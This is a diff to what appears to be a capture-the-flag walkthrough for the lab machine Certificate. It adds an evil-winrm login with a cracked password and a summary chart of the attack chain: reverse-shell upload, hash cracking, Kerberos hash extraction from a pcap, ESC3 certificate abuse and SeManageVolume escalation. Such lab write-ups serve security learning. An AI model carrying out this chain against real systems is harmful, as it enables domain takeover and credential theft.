@@ -439,7 +439,7 @@ Some kerberos packets involving `WS-01` is found in the pcap file:
 
 ![](https://github.com/user-attachments/assets/ef40cb5e-baca-41aa-80fd-a6854510134f)
 
-### 4.2. Extracting Kerberos credentials from PCAP
+### 4.2. Extracting Kerberos credentials from PCAP file
 
 Googling returns a useful utility on GitHub to that parses Kerberos packets from pcap files to extract `AS-REQ`, `AS-REP` and `TGS-REP` hashes: [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser)
 
@@ -473,6 +473,25 @@ Hash.Target......: $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7...e852f0
 Credentials found:
 - username: `Lion.SK`
 - password: `!QAZ2wsx`
+
+### 4.3. Connect as Lion.SK and get user.txt
+
+```console
+root@kali:~# evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+```
+
+```pwsh
+*Evil-WinRM* PS C:\Users\Lion.SK\Documents> type ..\Desktop\user.txt
+ba625fb1b9c737ce84d2e12c3ddd69e6
+```
 
 ## 5. Targeting the certification authority
 
@@ -866,4 +885,26 @@ Info: Establishing connection to remote endpoint
 ```pwsh
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Content ..\Desktop\root.txt
 fa65c690b89bc57335044b8c88a5e641
+```
+
+## 6. Summary
+
+```mermaid
+flowchart TD
+  A(Certification web site) -->|Explore student registration and course mgmt| B(Discover RCE via upload function)
+  B -->|Craft package with php reverse shell code for upload| C(Reverse shell connected as xamppuser)
+  C -->|Explore xampp files| D(Discover database connection code with embedded credentials)
+  D -->|Connect to database| E(Discover table with password hash for Sara.B)
+  E -->|Crack password hash with john against rockyou| F(evil-winrm connection as Sara.B)
+  F -->|Explore Sara.B user profile| G(Discover WS-01 PCAP file)
+  G -->|Extract kerberos credentials from PCAP file| H(Acquire kerberos hash for Lion.SK)
+  H -->|Crack hash with hashcat against rockyou| I(evil-winrm connection as Lion.SK)
+  I --> I1[user.txt]
+  I -->|Discover Lion.SK membership to Certificate Service DCOM Access| K(Scan certification details using certipy)
+  K -->|Discover ESC3 vulnerability| L(Request certificate for Ryan.K)
+  L -->|Request TGT with Ryan.K certificate| M(evil-winrm access with Ryan.K)
+  M -->|Discover SeManageVolumePrivilege| N(Run SeManageVolumeExploit.exe to give everyone Full Control on C:)
+  N -->|Export CA pfx bundle with Full Control on C:| O(Forge Administrator certificate)
+  O -->|Request TGT with Administrator certificate| P(evil-winrm access with Administrator)
+  P --> P1[root.txt]
 ```
